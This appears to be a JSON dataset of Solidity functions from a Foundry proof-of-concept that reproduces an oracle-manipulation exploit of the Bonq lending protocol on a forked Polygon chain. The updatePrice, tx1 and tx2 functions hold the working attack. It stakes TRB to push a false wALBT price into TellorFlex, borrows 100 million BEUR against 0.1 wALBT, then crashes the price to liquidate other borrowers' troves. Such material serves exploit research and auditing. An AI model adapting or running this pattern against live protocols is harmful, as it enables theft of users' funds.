[
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PriceReporter",
    "source_type": "attacker_contract",
    "function_name": "updatePrice",
    "original_code": "    function updatePrice(uint256 _tokenId, uint256 _price) public {\n        bytes memory queryData =\n            hex\"00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000953706f745072696365000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004616c62740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037573640000000000000000000000000000000000000000000000000000000000\"; // not sure what this means\n        bytes32 queryId = keccak256(queryData);\n        bytes memory price = abi.encodePacked(_price);\n        TRB.approve(address(TellorFlex), type(uint256).max);\n        TellorFlex.depositStake(_tokenId);\n        TellorFlex.submitValue(queryId, price, 0, queryData);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testAttackTx1",
    "original_code": "    function testAttackTx1() public {\n        // Only run attack Tx1\n        vm.createSelectFork(\"polygon\", 38_792_977);\n        exploit = new Exploit();\n\n        deal(address(TRB), address(exploit), 10e18);\n        deal(address(WALBT), address(exploit), 13.35973256272339977e18);\n\n        exploit.tx1_mintMassiveAmountOfBEUR();\n\n        // Print BEUR exploit result\n        emit log_named_decimal_uint(\"[result] BEUR balance in Exploit contract\", BEUR.balanceOf(address(exploit)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testAttackTx2",
    "original_code": "    function testAttackTx2() public {\n        // Only run attack Tx2\n        vm.createSelectFork(\"polygon\", 38_793_028);\n        exploit = new Exploit();\n\n        deal(address(TRB), address(exploit), 20e18);\n        deal(address(WALBT), address(exploit), 13.35973256272339977e18 * 2);\n        deal(address(BEUR), address(exploit), 100_000_000e18); // profit from tx1\n\n        exploit.tx2_liquidateMassiveAmountOfALBT();\n\n        // Print ALBT exploit result\n        emit log_named_decimal_uint(\"[result] wALBT balance in Exploit contract\", WALBT.balanceOf(address(exploit)), 18);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Attacker",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Full simulation, run Tx1 and Tx2\n        vm.createSelectFork(\"polygon\", 38_792_977);\n        exploit = new Exploit();\n\n        // Pre-works, check out: https://polygonscan.com/address/0xed596991ac5f1aa1858da66c67f7cfa76e54b5f1#tokentxns\n        deal(address(TRB), address(exploit), 20e18); // just for staking purposes, we simplify to 20e18 :)\n        deal(address(WALBT), address(exploit), 13.35973256272339977e18 * 2);\n\n        exploit.tx1_mintMassiveAmountOfBEUR();\n\n        vm.roll(38_793_028);\n        vm.warp(1_675_276_266);\n\n        exploit.tx2_liquidateMassiveAmountOfALBT();\n\n        // Print exploit result\n        emit log_named_decimal_uint(\"[result] BEUR balance in Exploit contract\", BEUR.balanceOf(address(exploit)), 18);\n        emit log_named_decimal_uint(\"[result] wALBT balance in Exploit contract\", WALBT.balanceOf(address(exploit)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "tx1_mintMassiveAmountOfBEUR",
    "original_code": "    function tx1_mintMassiveAmountOfBEUR() public {\n        // func_0xa11ce20c\n        console.log(\"Update wALBT price to extremely high\");\n        PriceReporter Reporter = new PriceReporter();\n        TRB.transfer(address(Reporter), TellorFlex.getStakeAmount()); // transfer 10 TRB to price reporter\n        Reporter.updatePrice(10e18, 5e27);\n\n        console.log(\"Use 0.1 wALBT as collateral, borrow massive amount of BEUR\");\n        maliciousTrove = BonqProxy.createTrove(address(WALBT)); // attacker create a new trove\n        WALBT.transfer(maliciousTrove, 0.1 * 1e18); // transfer 0.1 wALBT to trove as collateral\n        ITrove(maliciousTrove).increaseCollateral(0, address(0));\n        ITrove(maliciousTrove).borrow(address(this), 100_000_000e18, address(0)); // borrow 100,000,000 BEUR\n\n        console.log(\"Create another trove for attack Tx2\");\n        maliciousTrove2 = BonqProxy.createTrove(address(WALBT));\n        WALBT.transfer(maliciousTrove2, WALBT.balanceOf(address(this)));\n        ITrove(maliciousTrove2).increaseCollateral(0, address(0));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "tx2_liquidateMassiveAmountOfALBT",
    "original_code": "    function tx2_liquidateMassiveAmountOfALBT() public {\n        // func_0x770344d9\n        console.log(\"Update wALBT price to extremely low\");\n        PriceReporter Reporter = new PriceReporter();\n        TRB.transfer(address(Reporter), TellorFlex.getStakeAmount()); // transfer 10 TRB to price reporter\n        Reporter.updatePrice(10e18, 0.0000001 * 1e18);\n\n        console.log(\"Get all trove addresses\");\n        address[] memory troves = new address[](45);\n        troves[0] = BonqProxy.firstTrove(address(WALBT));\n        troves[44] = BonqProxy.lastTrove(address(WALBT));\n        require(troves[44] == 0x5343c5d0af82b89DF164A9e829A7102c4edB5402, \"Last trove creator is not attacker\"); // note: assert troves[44] is maliciousTrove2\n\n        for (uint256 i = 1; i < troves.length; ++i) {\n            // troves[1] ~ troves[44]\n            troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i - 1]);\n        }\n\n        console.log(\"Liqudate all borrowers\");\n        for (uint256 i = 1; i < troves.length - 1; ++i) {\n            address target = troves[i];\n            require(BonqProxy.containsTrove(address(WALBT), target)); // check target exists before exploit\n            uint256 debt = ITrove(target).debt();\n            if (debt == 0) {\n                continue; // trove no debt, pass\n            }\n            ITrove(target).liquidate();\n        }\n\n        console.log(\"Repay attacker's trove debt\");\n        BEUR.approve(troves[44], type(uint256).max);\n        ITrove(troves[44]).repay(type(uint256).max, address(0));\n        uint256 walbt_in_attacker_trove = WALBT.balanceOf(troves[44]);\n        emit log_named_decimal_uint(\"[debug] WALBT balance in attacker's trove\", walbt_in_attacker_trove, 18);\n\n        console.log(\"Withdraw wALBT to Exploit contract\");\n        address maliciousTrove2_owner = ITrove(troves[44]).getRoleMember(keccak256(\"OWNER_ROLE\"), 0);\n        vm.prank(maliciousTrove2_owner);\n        ITrove(troves[44]).decreaseCollateral(address(this), walbt_in_attacker_trove, address(0));\n    }\n\n",
    "description": ""
  }
]